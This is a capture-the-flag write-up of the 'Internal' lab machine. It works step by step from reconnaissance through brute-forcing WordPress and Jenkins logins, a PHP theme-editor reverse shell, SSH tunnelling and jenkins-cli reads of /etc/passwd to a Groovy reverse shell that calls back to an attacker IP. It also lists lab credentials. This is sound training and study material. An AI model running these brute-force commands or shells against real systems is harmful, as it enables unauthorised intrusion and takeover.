---
description: Penetration Testing Challenge
---

# Internal

## Reconnaissance

As always i ran nmap to list open ports.

`sudo nmap -sC -sV -O -oN nmap/scan <IP>`

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oN**: output normal format and store in file nmap/scan

I get back the following result showing that these ports are open:

* **Port 22**: running OpenSSH 7.6p1 on Ubuntu
* Port 80: running Apache httpd 2.4.29 on Ubuntu

<figure><img src="../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

## Enumeration

<figure><img src="../../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Found a blog directory on the server. Especially e blog with the CMS WordPress. To enumerate further i can do that with wappalyzer and even get the version:

<figure><img src="../../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Could be a legitimate user on the CMS.

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

The error message proofs that there is a user called admin.

**Doing it the hydra-way**

`hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.15.92 http-form-post "//blog/wp-login.php:log=^USER^&pwd=^PASS^:F=is incorrect." -V`

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Doing it the ffuf-way**

First i saved the request from Burp in a file:

<figure><img src="../../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

`ffuf -request req -request-proto http -w /usr/share/wordlists/rockyou.txt:FUZZPASS -t 100 -fs 4941`

<figure><img src="../../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

**Doing it the wpscan-way**

I like ot try different tools so i decided to take a thirth tool called wpscan:

`wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt`

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

As the results show the password for the admin user is `my2boys`. hydra took 06:40 minutes, ffuf took less than a minute and wpsacn took 02:53 minutes to get the correct password.

Logging in with the credentials gives the following screen:

`admin:my2boys`

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Looking at the posts**

There was one Post set to private.

<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Credentials found: william:arnold147

## Exploitation #1: WordPress Theme (Reverse Shell)

Go to the Template Editor from:

`Appearance > Theme Editor > index.php`

Backup the index.php on the system as index.php.bak

Override index.php with PHP reverse shell code ([https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)) and start up a netcat listener on port 4444.

`cat shell.php | xclip -selection clipboard`

<figure><img src="../../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

As a Penetration tester here would end the journey and starts the report writing.

But in this case the customer wanted us to find the `user.txt` and `root.txt` to proof the exploitation.

**Internal Enumeration**

After `linpease.sh` has it's work done it showed a few interesting content.

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

The directory `containerd` is saying that there is running a container on the server. It might be a docker container. And there is an obviously suspicious file called wp-save.txt.

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

The content from /opt/wp-save.txt is showing credentials from a user called `aubreanna`.

Trying the credentials for an SSH connection let me connect to the host. I'm now the upper privileged user aubreanna and can read the user.txt file.

There could be docker running on this box as the following screenshot is showing:

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Running Enum4Linux shows that docker is running on the system:

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

jenkins (found information about it in /home/aubreanna/jenkins.txt) may run on a docker container.

Running netstat -ano to see there is a service running on port 8080 (default port of jenkins).

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Checking network configuration

<figure><img src="../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Docker is running on the VM and its on the same IP range (172.14.0.x) like jenkins does.

**SSH tunnelling**

To access jenkins i have to employ an SSH tunnelling technique to forward the jenkins IP and port from the victim VM to my VM.

`ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm`

**Calling Jenkins from the attacker**

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Following credentials did not work to login to jenkins:

* admin:admin
* aubreanna:bubb13guM!@#123
* william:arnold147

Getting jenkins version over `/oops` shows: Jenkins 2.250

**Running jenkins cli against jenkin**s

On the server is the jenkins cli which we can access from the outside. To get more information about it look at the documentation: [https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client](https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client)

&#x20;Getting the jenkins-cli.jar file from the victim.

[http://localhost:8080/jnlpJars/jenkins-cli.jar](http://localhost:8888/jnlpJars/jenkins-cli.jar)

**Running the commands to leak some informations**

`java -jar jenkins-cli.jar -noCertificateCheck -s http://127.0.0.1:8080 who-am-i "@/etc/passwd"`

<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Whit the following commands (`enable-job, keep-build`) the result is not as good as expected.

`java -jar jenkins-cli.jar -noCertificateCheck -s http://127.0.0.1:8080 enable-job "@/etc/passwd"`

`java -jar jenkins-cli.jar -noCertificateCheck -s http://127.0.0.1:8080 keep-build "@/etc/passwd"`

This doesn't help. There must me an other way.



**Doing it the ZAP-way**

Doing it with OWASP ZAP instead of the community edition of Burp suite because of the usage of the large rockyou.txt file and to try an other tool.

Loading the site and add admin:test to get content in ZAP

Right click > Attack > Fuzz

<figure><img src="../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Load the file and start the fuzzer.

The password for admin was found in a couple of seconds.

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

I can now login with the credentials admin:spongebob on jenkins.

**Script Console**

Running the reverse shell (Groovy) on the script console under Manage Jenkins > Script Console.

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

`String host="10.11.76.23";`\
`int port=4444;`\
`String cmd="bash";`\
`Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`

<figure><img src="../../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>



**Looking in the /opt directory**

<figure><img src="../../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Just switch user and enter found password in docker container:

`root:tr0ub13guM!@#123`

<figure><img src="../../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

## Discovered vulnerabilities

1. CWE-521: Weak Password Requirements
2. CWE-257: Storing Passwords in a Recoverable Format
3. CWE-1392: Use of Default Credentials

## Lessons learned

1. Running a couple of tools to get the exactly same result can level up your tool skills. In this case i ran hydra, ffuf and wpscan to brute force a login form with a found default loginname. ffuf was the fastest tool (under one minute) but had some preparations before running it. I needed burpsuite (an other tool) to capture the request to manipulate the variables for ffuf. For future password brute-force attacks especially for wordpress sites i think wpscan is the beter choice (no preparation and it's fast).
2. Always run linpeas or enum4linux to get the interesting spots quickly. Also have a look inside of the `opt` directory.
3. Running `netstat -ano` to show running services with their port.
4. SSH-Tunneling to get the local website running on the VM locally.
5. In a jenkins environment go stright to the script console and try to get a reverse shell instead of poking around with the builds.
